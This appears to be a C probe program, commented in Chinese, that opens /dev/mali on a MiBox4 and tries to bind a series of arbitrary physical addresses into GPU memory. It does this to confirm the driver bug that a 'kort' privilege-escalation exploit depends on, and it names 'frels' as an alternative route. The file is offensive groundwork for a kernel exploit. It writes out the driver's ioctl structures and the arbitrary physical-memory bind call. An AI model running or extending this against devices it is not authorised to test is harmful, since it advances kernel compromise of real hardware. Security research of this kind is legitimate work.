/*
 * kort_probe_miboxs.c
 * 只做一件事：探测 /dev/mali 是否暴露 kort 利用所依赖的 bug ——
 * 即 _MALI_UK_BIND_MEM 是否允许把"任意外部物理内存"映射到 GPU。
 * 若 BIND 对任意 phys 返回 0（成功），说明 bug 存在、kort 路线可行；
 * 若返回 EINVAL/EBUSY 等，说明该驱动（很可能是闭源 mali.ko）已限制外部物理绑定。
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define MALI_IOC_BASE 0x82
#define _MALI_UK_MEMORY_SUBSYSTEM 1
#define MALI_IOC_MEMORY_BASE (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)
#define _MALI_UK_ALLOC_MEM 0
#define _MALI_UK_BIND_MEM 2
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

typedef struct {
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle;
} mali_uk_alloc_mem_s;

typedef struct {
    uint64_t ctx;
    uint32_t vaddr;
    uint32_t size;
    uint32_t flags;
    uint32_t padding;
    union {
        struct { uint32_t secure_id; uint32_t rights; uint32_t flags; } bind_ump;
        struct { uint32_t mem_fd; uint32_t rights; uint32_t flags; } bind_dma_buf;
        struct { uint32_t phys_addr; uint32_t rights; uint32_t flags; } bind_ext_memory;
    } mem_union;
} mali_uk_bind_mem_s;

#define MALI_IOC_MEM_ALLOC \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_BIND \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, mali_uk_bind_mem_s)

#define PAGE_SIZE 4096

int main() {
    printf("[*] probing /dev/mali on MIBOX4 ...\n");
    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) {
        printf("[-] open /dev/mali failed: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] opened /dev/mali fd=%d\n", fd);

    // 1) 基本内存分配是否可用
    mali_uk_alloc_mem_s alloc = {0};
    alloc.gpu_vaddr = 0x40000000;
    alloc.psize = PAGE_SIZE * 4;
    alloc.vsize = PAGE_SIZE * 4;
    int r = ioctl(fd, MALI_IOC_MEM_ALLOC, &alloc);
    printf("[1] ALLOC -> ret=%d errno=%d (%s) backend=0x%llx\n",
           r, errno, strerror(errno), (unsigned long long)alloc.backend_handle);

    // 2) 关键探测：BIND 任意外部物理内存是否被允许（kort 的核心 bug）
    uint32_t cand[] = { 0x00000000, 0x01000000, 0x10000000, 0x80000000, 0xF0000000 };
    int n = sizeof(cand)/sizeof(cand[0]);
    for (int i = 0; i < n; i++) {
        mali_uk_bind_mem_s b = {0};
        b.vaddr = 0x40030000;
        b.size  = PAGE_SIZE;
        b.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
        b.mem_union.bind_ext_memory.phys_addr = cand[i];
        b.mem_union.bind_ext_memory.rights = 0x37;
        int rb = ioctl(fd, MALI_IOC_MEM_BIND, &b);
        const char *tag = (rb == 0) ? "  <== ACCEPTED (bug present?)" : "";
        printf("[2] BIND phys=0x%08x -> ret=%d errno=%d (%s)%s\n",
               cand[i], rb, errno, strerror(errno), tag);
    }

    close(fd);
    printf("[*] done. 若上面任意 BIND 被 ACCEPTED，kort 路线可行；\n");
    printf("    否则该驱动限制外部物理绑定，需换 frels 或确认闭源 mali.ko 接口。\n");
    return 0;
}
